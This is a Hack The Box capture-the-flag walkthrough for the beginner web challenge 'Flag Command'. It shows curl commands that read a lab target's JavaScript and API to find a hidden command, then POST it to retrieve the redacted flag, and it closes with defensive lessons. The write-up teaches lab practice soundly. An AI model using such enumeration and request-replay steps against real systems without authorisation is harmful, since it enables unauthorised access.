# Hack The Box - Flag Command Walkthrough

## Synopsis

Flag Command is a beginner-friendly web challenge that demonstrates how client-side source code can expose hidden application functionality. By reviewing the JavaScript files loaded by the web application and enumerating available API endpoints, a hidden command can be discovered and submitted directly to obtain the flag.

---

## Phase 1: Reconnaissance & Enumeration

**Concept:** Identifying the application technology and exposed resources.

**Command:**

```bash
curl -v http://154.57.164.68:30101
```

**How it works in practice:** Accessing the target reveals a Flask-based web application running on a Werkzeug server. The returned HTML references several JavaScript files responsible for the game's functionality, making them ideal targets for source code review.

**Discovered Resources:**

- **commands.js** – Contains game messages and available commands.
- **main.js** – Handles command validation and game logic.
- **game.js** – Handles win and loss conditions.
- **/api/options** – Returns available game commands.
- **/api/monitor** – Accepts user commands.

---

## Phase 2: Source Code Review

**Concept:** Inspecting client-side JavaScript for hidden functionality.

**Commands:**

```bash
curl http://154.57.164.68:30101/static/terminal/js/commands.js

curl http://154.57.164.68:30101/static/terminal/js/main.js
```

**Walkthrough Details:**

- Reviewing the JavaScript files revealed that commands are validated against a predefined list of available options.
- Inside the game logic, commands are checked against both the current game state and a hidden command category named **secret**.
- This indicates the existence of functionality not exposed through the normal game interface.

---

## Phase 3: API Enumeration

**Concept:** Interacting directly with backend endpoints.

**Command:**

```bash
curl http://154.57.164.68:30101/api/options
```

**How it works in practice:** Querying the API returns every valid command available to the application, including commands not visible to normal users.

**Interesting Discovery:**

```text
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

This command appears inside the hidden **secret** command list.

---

## Phase 4: Command Injection Through the API

**Concept:** Submitting the hidden command directly to the backend.

**Command:**

```bash
curl -X POST http://154.57.164.68:30101/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

**How it works in practice:** The frontend communicates with the backend using JSON requests. Instead of using the game's interface, we can manually replicate the request and submit the hidden command directly to the `/api/monitor` endpoint.

The server processes the command and returns the challenge flag.

---

## Phase 5: Flag Capture

**Concept:** Leveraging exposed application logic to retrieve sensitive information.

**Result:**

```text
HTB{REDACTED}
```

**How it works in practice:** The challenge relies on the assumption that hidden functionality remains undiscovered. Because the command validation logic and API responses are exposed to every user, the secret command can be extracted and submitted without completing the intended game flow.

---

## Key Lessons Learned

**Client-side JavaScript is public:** Any code delivered to a browser can be reviewed and analyzed.

**Hidden functionality is not access control:** Sensitive commands should never rely on obscurity alone.

**API enumeration is valuable:** Backend endpoints often expose information not visible through the user interface.

**Source code review is a powerful enumeration technique:** Even simple applications may reveal secrets through publicly accessible files.

---

## Tools Used

```text
curl
Browser Developer Tools
JavaScript Source Review
```

## Skills Practiced

```text
Web Enumeration
API Discovery
Source Code Analysis
Client-Side Security Review
```
